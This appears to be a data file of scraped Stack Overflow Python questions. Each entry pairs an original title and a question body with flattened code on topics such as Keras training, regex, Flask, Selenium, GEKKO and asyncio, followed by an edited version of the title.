activation='softmax')(reshape_layer_2) return Model(inputs=[input_layer], outputs=[out])train_ds = make_tfdataset(for_training=True)clf_model = create_model(in_shape=(6, 16, 16, 16, 3))clf_model.summary()clf_model.compile(optimizer=Adam(lr=1e-3), loss='categorical_crossentropy', metrics=['accuracy', 'categorical_crossentropy'])history = clf_model.fit(train_ds, epochs=500, steps_per_epoch=ceil(240 / BATCH_SIZE), verbose=1)",Keras model fails to decrease loss
Keras model fails to decrease loss (toy example using tf.data API)," I propose a example in which a tf.keras model fails to learn from very simple data. I'm using tensorflow-gpu==2.0.0, keras==2.3.0 and Python 3.7. At the end of my post, I give the Python code to reproduce the problem I observed.DataThe samples are Numpy arrays of shape (6, 16, 16, 16, 3). To make things very simple, I only consider arrays full of 1s and 0s. Arrays with 1s are given the label 1 and arrays with 0s are given the label 0. I can generate some samples (in the following, n_samples = 240) with this code: In order to input this data in a tf.keras model, I create an instance of tf.data.Dataset using the code below. This will essentially create shuffled batches of BATCH_SIZE = 12 samples. ModelI propose the following model to classify my samples: The model is optimized using Adam (with default parameters) and with the binary_crossentropy loss: The output of clf_model.summary() is: TrainingThe model is trained for 500 epochs as follows: The problem! During the 500 epochs, the model loss stays around 0.69 and never goes below 0.69. This is also true if I set the learning rate to 1e-2 instead of 1e-3. The data is very simple (just 0s and 1s). Naively, I would expect the model to have a better accuracy than just 0.6. In fact, I would expect it to reach 100% accuracy quickly. What I am doing wrong?The full code... <code>  def generate_fake_data(): for j in range(1, 240 + 1): if j < 120: yield np.ones((6, 16, 16, 16, 3)), np.array([0., 1.]) else: yield np.zeros((6, 16, 16, 16, 3)), np.array([1., 0.]) def make_tfdataset(for_training=True): dataset = tf.data.Dataset.from_generator(generator=lambda: generate_fake_data(), output_types=(tf.float32, tf.float32), output_shapes=(tf.TensorShape([6, 16, 16, 16, 3]), tf.TensorShape([2]))) dataset = dataset.repeat() if for_training: dataset = dataset.shuffle(buffer_size=1000) dataset = dataset.batch(BATCH_SIZE) dataset = dataset.prefetch(tf.data.experimental.AUTOTUNE) return dataset def create_model(in_shape=(6, 16, 16, 16, 3)): input_layer = Input(shape=in_shape) reshaped_input = Lambda(lambda x: K.reshape(x, (-1, *in_shape[1:])))(input_layer) conv3d_layer = Conv3D(filters=64, kernel_size=8, strides=(2, 2, 2), padding='same')(reshaped_input) relu_layer_1 = ReLU()(conv3d_layer) pooling_layer = GlobalAveragePooling3D()(relu_layer_1) reshape_layer_1 = Lambda(lambda x: K.reshape(x, (-1, in_shape[0] * 64)))(pooling_layer) expand_dims_layer = Lambda(lambda x: K.expand_dims(x, 1))(reshape_layer_1) conv1d_layer = Conv1D(filters=1, kernel_size=1)(expand_dims_layer) relu_layer_2 = ReLU()(conv1d_layer) reshape_layer_2 = Lambda(lambda x: K.squeeze(x, 1))(relu_layer_2) out = Dense(units=2, activation='softmax')(reshape_layer_2) return Model(inputs=[input_layer], outputs=[out]) clf_model = create_model()clf_model.compile(optimizer=Adam(), loss='categorical_crossentropy', metrics=['accuracy', 'categorical_crossentropy']) Model: ""model""_________________________________________________________________Layer (type) Output Shape Param # =================================================================input_1 (InputLayer) [(None, 6, 16, 16, 16, 3) 0 _________________________________________________________________lambda (Lambda) (None, 16, 16, 16, 3) 0 _________________________________________________________________conv3d (Conv3D) (None, 8, 8, 8, 64) 98368 _________________________________________________________________re_lu (ReLU) (None, 8, 8, 8, 64) 0 _________________________________________________________________global_average_pooling3d (Gl (None, 64) 0 _________________________________________________________________lambda_1 (Lambda) (None, 384) 0 _________________________________________________________________lambda_2 (Lambda) (None, 1, 384) 0 _________________________________________________________________conv1d (Conv1D) (None, 1, 1) 385 _________________________________________________________________re_lu_1 (ReLU) (None, 1, 1) 0 _________________________________________________________________lambda_3 (Lambda) (None, 1) 0 _________________________________________________________________dense (Dense) (None, 2) 4 =================================================================Total params: 98,757Trainable params: 98,757Non-trainable params: 0 train_ds = make_tfdataset(for_training=True)history = clf_model.fit(train_ds, epochs=500, steps_per_epoch=ceil(240 / BATCH_SIZE), verbose=1) import numpy as npimport tensorflow as tfimport tensorflow.keras.backend as Kfrom math import ceilfrom tensorflow.keras.layers import Input, Dense, Lambda, Conv1D, GlobalAveragePooling3D, Conv3D, ReLUfrom tensorflow.keras.models import Modelfrom tensorflow.keras.optimizers import AdamBATCH_SIZE = 12def generate_fake_data(): for j in range(1, 240 + 1): if j < 120: yield np.ones((6, 16, 16, 16, 3)), np.array([0., 1.]) else: yield np.zeros((6, 16, 16, 16, 3)), np.array([1., 0.])def make_tfdataset(for_training=True): dataset = tf.data.Dataset.from_generator(generator=lambda: generate_fake_data(), output_types=(tf.float32, tf.float32), output_shapes=(tf.TensorShape([6, 16, 16, 16, 3]), tf.TensorShape([2]))) dataset = dataset.repeat() if for_training: dataset = dataset.shuffle(buffer_size=1000) dataset = dataset.batch(BATCH_SIZE) dataset = dataset.prefetch(tf.data.experimental.AUTOTUNE) return datasetdef create_model(in_shape=(6, 16, 16, 16, 3)): input_layer = Input(shape=in_shape) reshaped_input = Lambda(lambda x: K.reshape(x, (-1, *in_shape[1:])))(input_layer) conv3d_layer = Conv3D(filters=64, kernel_size=8, strides=(2, 2, 2), padding='same')(reshaped_input) relu_layer_1 = ReLU()(conv3d_layer) pooling_layer = GlobalAveragePooling3D()(relu_layer_1) reshape_layer_1 = Lambda(lambda x: K.reshape(x, (-1, in_shape[0] * 64)))(pooling_layer) expand_dims_layer = Lambda(lambda x: K.expand_dims(x, 1))(reshape_layer_1) conv1d_layer = Conv1D(filters=1, kernel_size=1)(expand_dims_layer) relu_layer_2 = ReLU()(conv1d_layer) reshape_layer_2 = Lambda(lambda x: K.squeeze(x, 1))(relu_layer_2) out = Dense(units=2, activation='softmax')(reshape_layer_2) return Model(inputs=[input_layer], outputs=[out])train_ds = make_tfdataset(for_training=True)clf_model = create_model(in_shape=(6, 16, 16, 16, 3))clf_model.summary()clf_model.compile(optimizer=Adam(lr=1e-3), loss='categorical_crossentropy', metrics=['accuracy', 'categorical_crossentropy'])history = clf_model.fit(train_ds, epochs=500, steps_per_epoch=ceil(240 / BATCH_SIZE), verbose=1)",Keras model fails to decrease loss
Why using `or` within an except clause doesn't cause a SyntaxError? Is there a valid use for it?," At work, I stumbled upon an except clause with an or operator: I know the exception classes should be passed as a tuple, but it bugged me that it wouldn't even cause a SyntaxError.So first I wanted to investigate whether it actually works. And it doesn't. So it did not catch the second exception, and looking at the bytecode, it becomes clearer why: So we can see, instruction 14 first loads the IndexError class onto the stack. Then it checks whether that value is True, which it is because of Python truthiness and finally jumps directly to instruction 20 where the exception match is done. Since instruction 18 was skipped, KeyError was never loaded onto the stack and therefore doesn't match.I tried with Python 2.7 and 3.6, same result.But then, why is it valid syntax? I imagine it being one of the following:It's an artifact from a really old version of Python.There is actually a valid use case for using or within an except clause.It's simply a limitation of the Python parser which might have to accept any expression after the except keyword.My vote is on 3 (given I saw some discussion about a new parser for Python) but I'm hoping someone can confirm that hypothesis. Because if it was 2 for example, I want to know that use case!Also, I'm a bit clueless on how I'd continue that exploration. I imagine I would have to dig into CPython parser's source code but idk where to find it and maybe there's an easier way? <code>  try: # Do something.except IndexError or KeyError: # ErrorHandling >>> def with_or_raise(exc):... try:... raise exc()... except IndexError or KeyError:... print('Got ya!')...>>> with_or_raise(IndexError)Got ya!>>> with_or_raise(KeyError)Traceback (most recent call last): File ""<stdin>"", line 1, in <module> File ""<stdin>"", line 3, in with_or_raiseKeyError >>> import dis>>> dis.dis(with_or_raise) 2 0 SETUP_EXCEPT 10 (to 12) 3 2 LOAD_FAST 0 (exc) 4 CALL_FUNCTION 0 6 RAISE_VARARGS 1 8 POP_BLOCK 10 JUMP_FORWARD 32 (to 44) 4 >> 12 DUP_TOP 14 LOAD_GLOBAL 0 (IndexError) 16 JUMP_IF_TRUE_OR_POP 20 18 LOAD_GLOBAL 1 (KeyError) >> 20 COMPARE_OP 10 (exception match) 22 POP_JUMP_IF_FALSE 42 24 POP_TOP 26 POP_TOP 28 POP_TOP 5 30 LOAD_GLOBAL 2 (print) 32 LOAD_CONST 1 ('Got ya!') 34 CALL_FUNCTION 1 36 POP_TOP 38 POP_EXCEPT 40 JUMP_FORWARD 2 (to 44) >> 42 END_FINALLY >> 44 LOAD_CONST 0 (None) 46 RETURN_VALUE",Why does using `or` within an except clause not cause a SyntaxError? Is there a valid use for it?
How to create a counter from a first value of a dataframe group?," I have a datframe as : For RES1, I want to create a counter variable RES where COND ==1. The value of RES for the first KEY of the group remains same as the VAL (Can I use cumcount() in some way). For RES2, then I just want to fill the missing values asthe previous value. (df.fillna(method='ffill')), I am thinking.. Aim is to look fir a vectorized solution that's most optimal over million rows. <code>  data=[[0,1,5], [0,1,6], [0,0,8], [0,0,10], [0,1,12], [0,0,14], [0,1,16], [0,1,18], [1,0,2], [1,1,0], [1,0,1], [1,0,2]]df = pd.DataFrame(data,columns=['KEY','COND','VAL']) KEY COND VAL RES1 RES20 0 1 5 5 51 0 1 6 6 62 0 0 8 63 0 0 10 64 0 1 12 7 75 0 0 14 76 0 1 16 8 87 0 1 18 9 98 1 0 2 2 29 1 1 0 3 310 1 0 1 311 1 0 2 3",How to create a increment var from a first value of a dataframe group?
How one can use HashiCorp Vault in Airflow?," I am starting to use Apache Airflow and I am wondering how to effectively make it use secrets and passwords stored in Vault. Unfortunately, search does not return meaningful answers beyond a yet-to-be-implemented hook in Airflow project itself. I can always use Python's hvac module to generically access Vault from PythonOperator but I was wondering if there is any better way or a good practice (e.g. maybe an Airflow plugin I missed). <code> ",How can one use HashiCorp Vault in Airflow?
how to use folium.icon," I am looking to use a custom fontawesome icon, thx.I would like to change the icon from folium.icon using fontawesome icons.For example, I want to change this: To a burger icon from fontawesome as shown below: But it does not work for me!Many thanks!!!! <code>  import folium m = folium.Map(location=(25.0431, 121.539723), zoom_start=12,tiles='Cartodb Positron') folium.Marker( location=[25.0431, 121.539723], icon=folium.Icon(color=""red"",icon=""fa-truck"", prefix='fa')).add_to(m) m folium.Marker( location=[25.0431, 121.539723], icon=folium.Icon(color=""red"",icon=""fa-hamburger"", prefix='fa')).add_to(m)",How to use folium.icon with fontawesome
"How to prevent pytest warning ""cannot collect test class 'TestCase' because it has a __new__ constructor"""," Update to more general case:How can I prevent a PytestCollectionWarning when testing a Class Testament via pytest? Simple example for testament.py: And the test_testament.py This creates a PytestCollectionWarning when run with pytest. Is there a way to suppress this warning for the imported module without turning all warnings off? <code>  class Testament(): def __init__(self, name): self.name = name def check(self): return True from testament.testament import Testamentdef test_send(): testament = Testament(""Paul"") assert testament.check()",How to prevent PytestCollectionWarning when testing class Testament via pytest
"Differences between re.match, re.search, re.matchall"," From the regex docs it says that:Pattern.match(...) If zero or more characters at the beginning of string match this regular expressionPattern.fullmatch(...) If the whole string matches this regular expressionPattern.search(...) Scan through string looking for the first location where this regular expression produces a matchGiven the above, why couldn't someone just always use search to do everything? For example: Are match and fullmatch just shortcuts (if they could be called that) for the search method? Or do they have other uses that I'm overlooking? <code>  re.search(r'...' # searchre.search(r'^...' or re.search(r'\A...' # matchre.search(r'^...$' or re.search(r'\A...\Z' # fullmatch","Differences between re.match, re.search, re.fullmatch"
"Is there any usage of self-referential lists or circular reference in list, eg. a.append(a)"," So if I have a list a and append a to it, I will get a list that contains it own reference. And this basically results in seemingly infinite recursions.And not only in lists, dictionaries as well: It could have been a good way to store the list in last element and modify other elements, but that wouldn't work as the change will be seen in every recursive reference.I get why this happens, i.e. due to their mutability. However, I am interested in actual use-cases of this behavior. Can somebody enlighten me? <code>  >>> a = [1,2]>>> a.append(a)>>> a[1, 2, [...]]>>> a[-1][-1][-1][1, 2, [...]] >>> b = {'a':1,'b':2}>>> b['c'] = b>>> b{'a': 1, 'b': 2, 'c': {...}}","Is there any usage of self-referential lists or circular reference in list, eg. appending a list to itself"
Python Type-Hinting Child class returning self," Is there any way to type an abstract parent class method such that the child class method is known to return itself, instead of the abstract parent. This is more to improve autocompletes for IDEs like PyCharm or VScode's python plugin. <code>  class Parent(ABC): @abstractmethod def method(self) -> [what to hint here]: passclass Child1(Parent) def method(self): pass def other_method(self): passclass GrandChild1(Child1) def other_method_2(self): pass",Type-Hinting Child class returning self
"UserWarning: Neither SQLALCHEMY_DATABASE_URI nor SQLALCHEMY_BINDS is set and flask command Error: No such command [""create_db""]"," I want to run some commands from terminal with 'flask' command but it isn't working.The Following is my project structure- As the flask run command runs the app, I am sure that my environment variable is set properly. However, when I try to use flask-cli-command like- I get, Error: No such command ""create_db"".The following is my FlaskUserAuthentication/commands.py file- and the FlaskUserAuthentication/__init__.py module (where the Flask app instance is initiated)- <code>  FlaskUserAuthentication FlaskUserAuthentication API __init__.py db_models.py routes.py Site __init__.py routes.py static form_style.css templates Site base_layout.html index.html logout.html profile.html signin.html signup.html __init__.py commands.py run.py venv flask create_db from FlaskUserAuthentication import app, dbfrom FlaskUserAuthentication.API.db_models import Group, Member, Project, Milestone@app.cli.command('create_db')def createDatabase(): db.create_all() print('***** Datebase created ****')#....some more commands from flask import Flaskfrom flask_sqlalchemy import SQLAlchemyapp = Flask(__name__)app.config['SECRET_KEY'] = 'justasamplekey'app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'db = SQLAlchemy(app)from FlaskUserAuthentication.API.routes import apifrom FlaskUserAuthentication.Site.routes import siteapp.register_blueprint(api)app.register_blueprint(site)","flask command Error: No such command [""create_db""]"
Python: Get the most efficient combination of a large List of objects based on a field," I'm looking to maximize the number of stars given a certain budget and max limit on the combination.Example question:With a budget of 500 euro, visiting only the maximum allowed restaurants or less, dine and collect the most stars possible.I'm looking to write an efficient algorithm, that could potentially process 1 million Restaurant instances for up to 10 max Restaurants.Note, this is a cross post from a question I asked yesterday:Java: Get the most efficient combination of a large List of objects based on a fieldThe solution below will assign 15$ per star to the r8 Restaurant, which means that when generating the list, it puts that into the list first, and with the remaining 70$ it can only get 2 more stars giving a total of 4 stars. However, if it was smart enough to skip the r8 restaurant ( even though it's the best dollar per star ratio ) the r1 restaurant would actually be a better choice for the budget, as it's 100$ cost and 5 stars.Can anyone help attempt the problem and beat the current solution? <code>  import itertoolsclass Restaurant(): def __init__(self, cost, stars): self.cost = cost self.stars = stars self.ratio = cost / stars def display(self): print(""Cost: $"" + str(self.cost)) print(""Stars: "" + str(self.stars)) print()r1 = Restaurant(100, 5)r2 = Restaurant(140, 3)r3 = Restaurant(90, 4)r4 = Restaurant(140, 3)r5 = Restaurant(120, 4)r6 = Restaurant(60, 1)r7 = Restaurant(40, 1)r8 = Restaurant(30, 2)r9 = Restaurant(70, 2)r10 = Restaurant(250, 5)print()print(""***************"")print(""** Unsorted: **"")print(""***************"")print()restaurants = [r1, r2, r3, r4, r5, r6, r7, r8, r9, r10]for restaurant in restaurants: print(restaurant.ratio, restaurant.stars)print()print(""***************"")print(""** Sorted: **"")print(""***************"")print()sorted_restaurants = sorted(restaurants, key = lambda x: x.ratio, reverse = True)for restaurant in sorted_restaurants: print(restaurant.ratio, restaurant.stars)print()print(""*********************"")print(""** Begin Rucksack: **"")print(""*********************"")print()max = 5budget = 100spent = 0quantity = 0rucksack = []for i in itertools.count(): if len(rucksack) >= max or i == len(sorted_restaurants): break sorted_restaurants[i].display() if sorted_restaurants[i].cost + spent <= budget: spent = spent + sorted_restaurants[i].cost rucksack.append(sorted_restaurants[i]) print(""Total Cost: $"" + str(sum([x.cost for x in rucksack])))print(""Total Stars: "" + str(sum([x.stars for x in rucksack])))print()print(""*****************"")print(""** Final List: **"")print(""*****************"")print()for restaurant in rucksack: restaurant.display()",Get the most efficient combination of a large List of objects based on a field
Python/Selenium/Chrome/ --headless mode," I have a question about --headless mode in Python Selenium for Chrome.Code When I'm remove chrome_options.add_argument(""--headless"") all working good, but with this --headless* got next issue What is the difference for normal mode and --headless? <code>  from selenium import webdriver from selenium.webdriver.common.desired_capabilities import DesiredCapabilities CHROME_DRIVER_DIR = ""selenium/chromedriver"" chrome_options = webdriver.ChromeOptions() caps = DesiredCapabilities().CHROME chrome_options.add_argument(""--disable-dev-shm-usage"") chrome_options.add_argument(""--remote-debugging-port=9222"") chrome_options.add_argument(""--headless"") # Runs Chrome in headless mode. chrome_options.add_argument('--no-sandbox') # # Bypass OS security model chrome_options.add_argument(""--disable-extensions"") chrome_options.add_argument(""--disable-gpu"") browser = webdriver.Chrome(desired_capabilities=caps, executable_path=CHROME_DRIVER_DIR, options=chrome_options) browser.get(""https://www.manta.com/c/mm2956g/mashuda-contractors"") print(browser.page_source) browser.quit() Please enable cookies.Error 1020 Ray ID: 53fd62b4087d8116 2019-12-04 11:19:28 UTCAccess deniedWhat happened?This website is using a security service to protect itself from online attacks.Cloudflare Ray ID: 53fd62b4087d8116 Your IP: 168.81.117.111 Performance & security by Cloudflare",What is the difference in accessing Cloudflare website using ChromeDriver/Chrome in normal/headless mode through Selenium Python
How to get the cells of a sudoku grid picture with OpenCV?," I've been trying for the last few days to get a sudoku grid from a picture, and I have been struggling on getting the smaller squares of the grid.I am working on the picture below. I thought processing the image with a canny filter would work fine, but it didn't and I couldn't get every contour of each square. I then put adaptive threshold, otsu, and a classic thresholding to the test, but every time, it just could not seem to capture every small square.The final goal is to get the cells containing a number, and recognize the numbers with pytorch, so I would really like to have some clean images of the numbers, so the recognition doesn't screw up :)Would anyone have an idea on how to achieve this?Thanks a lot in advance! :D <code> ",How to get the cells of a sudoku grid with OpenCV?
How to place for loop list into another new list?," Code Output GoalI am intending to split the list, grab the 1st and 2nd words for each section, and put them into a new list.QuestionWhy is my output giving me a weird output? Where am I going wrong?Desired OutputMy desired output should look like this: Grabbing the 1st and 2nd words and put them into 1 list. <code>  #Variablesvar1 = ['Warehouse Pencil 1.docx', 'Production Pen 20.docx']list1 = []for x in var1: splitted = x.split() a = [splitted[0] + ' ' + splitted[1]] list1.append(a) print(list1) [['Warehouse Pencil']][['Warehouse Pencil'], ['Production Pen']] ['Warehouse Pencil', 'Production Pen']",How to fill a new list while iterating over another list?
When CPython set `in` operator is O(n)?," I was reading about the time complexity of set operations in CPython and learned that the in operator for sets has the average time complexity of O(1) and worst case time complexity of O(n). I also learned that the worst case wouldn't occur in CPython unless the set's hash table's load factor is too high.This made me wonder, when such a case would occur in the CPython implementation? Is there a simple demo code, which shows a set with clearly observable O(n) time complexity of the in operator? <code> ",When is CPython set `in` operator O(n)?
GEKKO Infeasible problem system of ODE equations of a fed-batch Bioreactor (python)," I am new to GEKKO and also to modeling bioreactors, so I might be missing something obvious.I have a system of 10 ODEs that describe a fed-batch bioreactor. All constants are given. The picture below shows the expected behavior of this model (extracted from a paper). However, the only feasible solution I found is when Viable Cells Density (XV) = 0, and stays 0 for all time t, or if time T is really small (<20). If a lower boundary >= 0 or initial value is set to XV and t > 20, the system becomes infeasible.Equations and constants were checked multiple times. I tried giving initial values to my variables, but it didn't work either. I can only think of two problems: I am not initiating variables properly, or I am not using GEKKO properly. Any ideas? Thanks!! Articles that used the exact same model:1) Master thesis using GEKKO ""MODELING OF MAMMALIAN CELL CULTURE"" link: https://search.proquest.com/openview/e4df2d115cbc48ec63235a64b352249c/1.pdf?pq-origsite=gscholar&cbl=18750&diss=y2) Original paper describing the equations: ""Process Model Comparison and Transferability Across Bioreactor Scales andModes of Operation for a Mammalian Cell Bioprocess""link: https://sci-hub.tw/10.1002/btpr.16643) Paper with a control sytem using that model: ""Glucose concentration control of a fed-batch mammalian cell bioprocess using a nonlinear model predictive controller""link: https://sci-hub.tw/https://doi.org/10.1016/j.jprocont.2014.02.007 <code>  import numpy as npfrom gekko import GEKKOimport matplotlib.pyplot as pltm = GEKKO(remote=False) # create GEKKO model#constants 3L continuous fed-batchKdQ = 0.001 #degree of degradation of glutamine (1/h)mG = 1.1*10**-10 #glucose maintenance coefficient (mmol/cell/hour)YAQ = 0.90 #yield of ammonia from glutamineYLG = 2 #yield of lactate from glucoseYXG = 2.2*10**8 #yield of cells from glucose (cells/mmol)YXQ = 1.5*10**9 #yield of cells from glutamine (cells/mmol)KL = 150 #lactate saturation constant (mM)KA = 40 #ammonia saturation constant (mM)Kdmax = 0.01 #maximum death rate (1/h)mumax = 0.044 #maximum growth rate (1/h)KG = 1 #glucose saturation constant (mM)KQ = 0.22 #glutamine saturation constant (mM)mQ = 0 #glutamine maintenance coefficient (mmol/cell/hour)kmu = 0.01 #intrinsic death rate (1/h)Klysis = 2*10**-2 #rate of cell lysis (1/h)Ci_star = 100 #inhibitor saturation concentration (mM)qi = 2.5*10**-10 #specific inhibitor production rate (1/h)#Flow, volume and concentrationFo = 0.001 #feed-rate (L/h)Fi = 0.001 #feed-rate (L/h)V = 3 #volume (L)SG = 653 #glucose concentration in the feed (mM)SQ = 58.8 #glutamine concentration in the feed (mM)# create GEKKO parametert = np.linspace(0,120,121)m.time = tXT = m.Var(name='XT') #total cell density (cells/L)XV = m.Var(lb=0, name='XV') #viable cell density (cells/L)XD = m.Var(name='XD') #dead cell density (cells/L)G = m.Var(value = 30, name='G') #glucose concentration (mM)Q = m.Var(value = 4.5, name='Q') #glutamine concentration (mM)L = m.Var(name='L') #lactate concentration (mM)A = m.Var(name='A') #ammonia concentration (mM)Ci = m.Var(name='Ci') #inhibitor concentration (mM)mu = m.Var(name='mu') #growth rate (1/h)Kd = m.Var(name='Kd') #death rate(1/h)# create GEEKO equationsm.Equation(XT.dt() == mu*XV - Klysis*XD - XT*Fo/V)m.Equation(XV.dt() == (mu - Kd)*XV - XV*Fo/V)m.Equation(XD.dt() == Kd*XV - Klysis*XD - XV*Fo/V)m.Equation(G.dt() == (Fi/V)*SG - (Fo/V)*G + (-mu/YXG - mG)*XV)m.Equation(Q.dt() == (Fi/V)*SQ - (Fo/V)*Q + (-mu/YXQ - mQ)*XV - KdQ*Q)m.Equation(L.dt() == -YLG*(-mu/YXG -mG)*XV-(Fo/V)*L)m.Equation(A.dt() == -YAQ*(-mu/YXQ - mQ)*XV +KdQ*Q-(Fo/V)*A)m.Equation(Ci.dt() == qi*XV - (Fo/V)*Ci)m.Equation(mu.dt() == (mumax*G*Q*(Ci_star-Ci)) / (Ci_star*(KG+G)*(KQ+Q)*(L/KL + 1)*(A/KA + 1)))m.Equation(Kd.dt() == Kdmax*(kmu/(mu+kmu)))# solve ODEm.options.IMODE = 4m.open_folder()m.solve(display = False)plt.plot(m.time, XV.value)",GEKKO Infeasible system of ODE equations of a fed-batch Bioreactor
GEKKO Infeasible system of ODE equations of a fed-batch Bioreactor (python)," I am new to GEKKO and also to modeling bioreactors, so I might be missing something obvious.I have a system of 10 ODEs that describe a fed-batch bioreactor. All constants are given. The picture below shows the expected behavior of this model (extracted from a paper). However, the only feasible solution I found is when Viable Cells Density (XV) = 0, and stays 0 for all time t, or if time T is really small (<20). If a lower boundary >= 0 or initial value is set to XV and t > 20, the system becomes infeasible.Equations and constants were checked multiple times. I tried giving initial values to my variables, but it didn't work either. I can only think of two problems: I am not initiating variables properly, or I am not using GEKKO properly. Any ideas? Thanks!! Articles that used the exact same model:1) Master thesis using GEKKO ""MODELING OF MAMMALIAN CELL CULTURE"" link: https://search.proquest.com/openview/e4df2d115cbc48ec63235a64b352249c/1.pdf?pq-origsite=gscholar&cbl=18750&diss=y2) Original paper describing the equations: ""Process Model Comparison and Transferability Across Bioreactor Scales andModes of Operation for a Mammalian Cell Bioprocess""link: https://sci-hub.tw/10.1002/btpr.16643) Paper with a control sytem using that model: ""Glucose concentration control of a fed-batch mammalian cell bioprocess using a nonlinear model predictive controller""link: https://sci-hub.tw/https://doi.org/10.1016/j.jprocont.2014.02.007 <code>  import numpy as npfrom gekko import GEKKOimport matplotlib.pyplot as pltm = GEKKO(remote=False) # create GEKKO model#constants 3L continuous fed-batchKdQ = 0.001 #degree of degradation of glutamine (1/h)mG = 1.1*10**-10 #glucose maintenance coefficient (mmol/cell/hour)YAQ = 0.90 #yield of ammonia from glutamineYLG = 2 #yield of lactate from glucoseYXG = 2.2*10**8 #yield of cells from glucose (cells/mmol)YXQ = 1.5*10**9 #yield of cells from glutamine (cells/mmol)KL = 150 #lactate saturation constant (mM)KA = 40 #ammonia saturation constant (mM)Kdmax = 0.01 #maximum death rate (1/h)mumax = 0.044 #maximum growth rate (1/h)KG = 1 #glucose saturation constant (mM)KQ = 0.22 #glutamine saturation constant (mM)mQ = 0 #glutamine maintenance coefficient (mmol/cell/hour)kmu = 0.01 #intrinsic death rate (1/h)Klysis = 2*10**-2 #rate of cell lysis (1/h)Ci_star = 100 #inhibitor saturation concentration (mM)qi = 2.5*10**-10 #specific inhibitor production rate (1/h)#Flow, volume and concentrationFo = 0.001 #feed-rate (L/h)Fi = 0.001 #feed-rate (L/h)V = 3 #volume (L)SG = 653 #glucose concentration in the feed (mM)SQ = 58.8 #glutamine concentration in the feed (mM)# create GEKKO parametert = np.linspace(0,120,121)m.time = tXT = m.Var(name='XT') #total cell density (cells/L)XV = m.Var(lb=0, name='XV') #viable cell density (cells/L)XD = m.Var(name='XD') #dead cell density (cells/L)G = m.Var(value = 30, name='G') #glucose concentration (mM)Q = m.Var(value = 4.5, name='Q') #glutamine concentration (mM)L = m.Var(name='L') #lactate concentration (mM)A = m.Var(name='A') #ammonia concentration (mM)Ci = m.Var(name='Ci') #inhibitor concentration (mM)mu = m.Var(name='mu') #growth rate (1/h)Kd = m.Var(name='Kd') #death rate(1/h)# create GEEKO equationsm.Equation(XT.dt() == mu*XV - Klysis*XD - XT*Fo/V)m.Equation(XV.dt() == (mu - Kd)*XV - XV*Fo/V)m.Equation(XD.dt() == Kd*XV - Klysis*XD - XV*Fo/V)m.Equation(G.dt() == (Fi/V)*SG - (Fo/V)*G + (-mu/YXG - mG)*XV)m.Equation(Q.dt() == (Fi/V)*SQ - (Fo/V)*Q + (-mu/YXQ - mQ)*XV - KdQ*Q)m.Equation(L.dt() == -YLG*(-mu/YXG -mG)*XV-(Fo/V)*L)m.Equation(A.dt() == -YAQ*(-mu/YXQ - mQ)*XV +KdQ*Q-(Fo/V)*A)m.Equation(Ci.dt() == qi*XV - (Fo/V)*Ci)m.Equation(mu.dt() == (mumax*G*Q*(Ci_star-Ci)) / (Ci_star*(KG+G)*(KQ+Q)*(L/KL + 1)*(A/KA + 1)))m.Equation(Kd.dt() == Kdmax*(kmu/(mu+kmu)))# solve ODEm.options.IMODE = 4m.open_folder()m.solve(display = False)plt.plot(m.time, XV.value)",GEKKO Infeasible system of ODE equations of a fed-batch Bioreactor
How to determine a active screen (monitor) of my Application window using python PyQt5?," I am working on an application which is using many widgets (QGroupBox, QVBoxLayout, QHBoxLayout). Initially it was developed on normal HD monitors. But, recently many of us upgraded to 4K resolution monitors. Now some of the buttons and sliders are compressed so small that they are unusable. Now I tried to make some changes so that the application can be used with both HD and 4K monitors.I started reading the link below:https://leomoon.com/journal/python/high-dpi-scaling-in-pyqt5/enter link description here I thought whenever my window is opened in a particular monitor I can call the following code: Then I tried to get the monitor resolution (pixel_x and pixel_y) using below code from using related post here. screen_width = 0, screen_height = 1 gives me the resolution of my primary monitor(mostly laptops in our case which are HD). screen_width = 78, screen_height = 79 gives me the combined resolution of virtual machines. But I do not understand how I can dynamically get these values depending upon where my application opened.My application window is developed in such a way that it will open in the same monitor where it was closed last time. The problem is now I want to get the active monitor resolution whenever my GUI is called and adapt to that resolution. I would be glad if someone can help me out.I am interested to know if I can call the screen resolution calculation every time that I drag my window from an HD monitor to a 4K monitor and Vice versa. Edit: I have found something similar in this post here But I could not get much from this. Edit2: Based on @Joe solution, Primary Screen Detection, Why is my primary screen always my laptop resolution even though I run the application on a 4K screen?I just tried to get the dpi of all the screens using the code below: <code>  if pixel_x > 1920 and pixel_y > 1080: Qapp.setAttribute(Qt.AA_EnableHighDpiScaling, True) Qapp.setAttribute(Qt.AA_UseHighDpiPixmaps, True)else: Qapp.setAttribute(Qt.AA_EnableHighDpiScaling, False) Qapp.setAttribute(Qt.AA_UseHighDpiPixmaps, False) import sys, ctypesuser32 = ctypes.windll.user32user32.SetProcessDPIAware()screen_width = 0 #78screen_height = 1 #79[pixel_x , pixel_y ] = [user32.GetSystemMetrics(screen_width), user32.GetSystemMetrics(screen_height)] def screen_selection(): app = QApplication(sys.argv) valid_screens = [] for index, screen_no in enumerate(app.screens()): screen = app.screens()[index] dpi = screen.physicalDotsPerInch() valid_screens.append(dpi) return valid_screens",How to determine an active screen (monitor) of my Application (window) using python PyQt5?
Match multiple(3+) occurrences of each character," I am looking for a regex pattern that will match third, fourth, ... occurrence of each character. Look below for clarification:For example I have the following string: I want to replace all the duplicated characters after the second occurrence. The output will be: Some regex patterns that I tried so far:Using the following regex I can find the last occurrence of each character:(.)(?=.*\1)Or using this one I can do it for consecutive duplicates but not for any duplicates: ([a-zA-Z1-9])\1{2,} <code>  111aabbccxccybbzaa1 11-aabbccx--y--z---",Match and remove duplicated characters: Replace multiple (3+) non-consecutive occurrences
Is it good to use asyncio.sleep() in long running code?," If I have some function, which does a lot of calculations, and it can take a while, is it good to use asyncio.sleep() between the parts of calculations to release event loop (to prevent blocking event loop)? Is there another, more better way to solve such problems? Some best practices, maybe? <code>  import asyncioasync def long_function(a, b, c): # some calculations await asyncio.sleep(0) # release event loop # some another calculations await asyncio.sleep(0) # release event loop",Is it good to use asyncio.sleep() in long running code to divide async function to multiple smaller parts of code?
Is it good to use asyncio.sleep() in long running code to divide async function to multiple smaller functions?," If I have some function, which does a lot of calculations, and it can take a while, is it good to use asyncio.sleep() between the parts of calculations to release event loop (to prevent blocking event loop)? Is there another, more better way to solve such problems? Some best practices, maybe? <code>  import asyncioasync def long_function(a, b, c): # some calculations await asyncio.sleep(0) # release event loop # some another calculations await asyncio.sleep(0) # release event loop",Is it good to use asyncio.sleep() in long running code to divide async function to multiple smaller parts of code?
